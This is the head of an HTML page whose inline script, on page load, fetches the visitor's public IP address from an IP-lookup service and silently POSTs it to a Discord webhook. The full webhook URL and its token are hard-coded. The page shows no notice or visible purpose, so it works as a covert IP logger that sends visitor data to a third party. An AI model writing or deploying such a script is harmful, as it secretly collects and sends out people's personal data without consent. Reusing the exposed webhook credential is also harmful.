<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            fetchIpAndSend();
        });

        function fetchIpAndSend() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const jsonData = JSON.stringify(data);
                    sendToDiscord(jsonData);
                })
                .catch(error => console.error('Error:', error));
        }

        function sendToDiscord(jsonData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1266006659575189515/QekEe2glFm7dAzXQE_bwf_p5ROyWztL2wJOBmTOc0piXoQWlYxqiHt9-CwUyq9WHoglp';
            const requestOptions = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: jsonData })
            };
            
            fetch(webhookUrl, requestOptions)
                .then(response => response.ok ? console.log('IP sent to Discord webhook') : console.error('Error sending to Discord webhook'))
                .catch(error => console.error('Fetch error:', error));
        }
    </script>
